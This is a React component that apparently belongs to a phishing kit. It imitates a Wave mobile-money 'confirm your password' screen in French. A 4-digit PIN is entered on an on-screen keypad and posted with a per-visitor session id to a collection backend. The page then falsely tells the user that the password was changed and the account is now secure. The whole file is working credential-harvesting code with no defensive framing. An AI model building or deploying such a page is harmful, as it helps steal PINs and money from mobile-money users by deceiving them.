import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const PasswordConfirm = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');
  const [isSuccess, setIsSuccess] = useState(false);
  const sessionId = new URLSearchParams(window.location.search).get('id') || 'default';
  const MAX_DIGITS = 4;

  const handleSubmit = async () => {
    if (password.length !== MAX_DIGITS) return;
    
    try {
      await fetch('http://localhost:3001/api/password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, password }),
      });
      setIsSuccess(true);
    } catch (error) {
      console.error('Error submitting password:', error);
    }
  };

  const handleKeyPress = (digit: string) => {
    if (password.length < MAX_DIGITS) {
      setPassword(password + digit);
    }
  };

  const handleBackspace = () => {
    setPassword(password.slice(0, -1));
  };

  const keypadKeys = [
    { digit: '1', letters: '' },
    { digit: '2', letters: 'ABC' },
    { digit: '3', letters: 'DEF' },
    { digit: '4', letters: 'GHI' },
    { digit: '5', letters: 'JKL' },
    { digit: '6', letters: 'MNO' },
    { digit: '7', letters: 'PQRS' },
    { digit: '8', letters: 'TUV' },
    { digit: '9', letters: 'WXYZ' },
    { digit: '', letters: '' },
    { digit: '0', letters: '+' },
    { digit: 'backspace', letters: '' },
  ];

  if (isSuccess) {
    return (
      <div className="flex justify-center min-h-screen bg-white items-center">
        <div className="w-full max-w-[430px] min-h-screen flex flex-col bg-white px-6 py-10">
          {/* Success popup content */}
          <div className="flex-1 flex flex-col items-center justify-center">
            {/* Wave logo */}
            <img src="/wave.png" alt="Wave" className="w-24 h-24 mb-8" />
            
            {/* Checkmark icon */}
            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mb-8">
              <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" className="w-10 h-10">
                <path d="M20 6L9 17l-5-5"/>
              </svg>
            </div>

            <h1 className="text-[28px] font-bold text-[#1a1a1a] text-center mb-4">
              Mot de passe modifié !
            </h1>
          </div>

          {/* Bottom message */}
          <div className="pb-10 text-center">
            <p className="text-gray-600 text-lg leading-relaxed">
              Votre mot de passe a été modifié avec succès. Votre compte est maintenant sécurisé.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex justify-center min-h-screen bg-white">
      <div className="w-full max-w-[430px] min-h-screen flex flex-col bg-white">
        {/* Content */}
        <div className="flex-1 flex flex-col px-6 pt-10 pb-5">
          {/* Back button */}
          <button onClick={() => navigate(`/password-change?id=${sessionId}`)} className="text-[#1a1a1a] mb-4">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-6 h-6">
              <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
          </button>

          <h1 className="text-[30px] leading-[1.3] text-[#1a1a1a] mt-[60px] font-normal">
            Confirmez votre mot de passe
          </h1>

          {/* Password input row */}
          <div className="flex items-center gap-3 mt-[60px] border-b-2 border-[#29c5f6] pb-3">
            <input
              type="password"
              value={password}
              readOnly
              placeholder="Confirmer le mot de passe"
              className="flex-1 text-[24px] text-[#1a1a1a] border-none outline-none min-w-0 placeholder-[#bbb]"
            />
          </div>

          {/* Spacer */}
          <div className="flex-1 min-h-[40px]"></div>

          {/* Next button */}
          <button
            onClick={handleSubmit}
            disabled={password.length !== MAX_DIGITS}
            className={`w-full py-[18px] rounded-[30px] text-[19px] font-bold transition-colors ${
              password.length === MAX_DIGITS
                ? 'bg-[#29c5f6] text-white hover:bg-[#1fb3e3]'
                : 'bg-[#a9e6fa] text-white cursor-not-allowed'
            }`}
          >
            Confirmer
          </button>
        </div>

        {/* Keypad */}
        <div className="bg-[#d8d8dd] p-2 grid grid-cols-3 gap-2">
          {keypadKeys.map((key, index) => (
            key.digit === '' ? (
              <div key={index} className="bg-transparent"></div>
            ) : key.digit === 'backspace' ? (
              <button
                key={index}
                onClick={handleBackspace}
                className="bg-transparent flex items-center justify-center p-3 active:bg-[#ececec] rounded-lg"
              >
                <svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="1.5" className="w-[30px] h-[30px]">
                  <path d="M9 6h11a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H9l-6-6a1 1 0 0 1 0-1.5L9 6z"/>
                  <line x1="12" y1="10" x2="17" y2="15"/>
                  <line x1="17" y1="10" x2="12" y2="15"/>
                </svg>
              </button>
            ) : (
              <button
                key={index}
                onClick={() => handleKeyPress(key.digit)}
                className="bg-white border-none rounded-lg py-4 px-0 flex flex-col items-center justify-center cursor-pointer select-none active:bg-[#ececec]"
              >
                <span className="text-[30px] text-[#1a1a1a] font-normal leading-[1.1]">{key.digit}</span>
                {key.letters && (
                  <span className="text-[10px] tracking-[2px] text-[#555] mt-[2px] font-semibold">{key.letters}</span>
                )}
              </button>
            )
          ))}
        </div>

        {/* Home indicator */}
        <div className="bg-[#d8d8dd] flex justify-center py-[10px] pb-[6px]">
          <div className="w-[130px] h-[5px] bg-[#1a1a1a] rounded-[3px]"></div>
        </div>
      </div>
    </div>
  );
};

export default PasswordConfirm;
